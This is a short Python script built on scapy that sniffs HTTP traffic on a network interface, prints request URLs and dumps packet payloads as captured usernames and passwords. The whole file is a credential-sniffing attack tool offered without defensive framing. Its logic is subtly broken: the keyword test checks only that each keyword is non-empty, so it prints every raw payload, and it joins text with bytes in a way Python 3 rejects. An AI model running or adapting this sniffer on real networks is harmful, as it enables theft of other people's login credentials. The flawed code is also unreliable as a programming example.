import scapy.all as scapy
from scapy.layers import http
import argparse


# def get_args():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-i", "--interface", dest="interface", help="Target Interface")
#     options = parser.parse_args()
#     return options

def sniff(face):
    scapy.sniff(iface=face, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] Http Request >> " + url.decode("utf-8"))
        if packet.haslayer(scapy.Raw):
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key:
                    print("[+] Passwords and Username >>" + packet[scapy.Raw].load)
                    break

# face =  get_args()
# sniff(face.interface)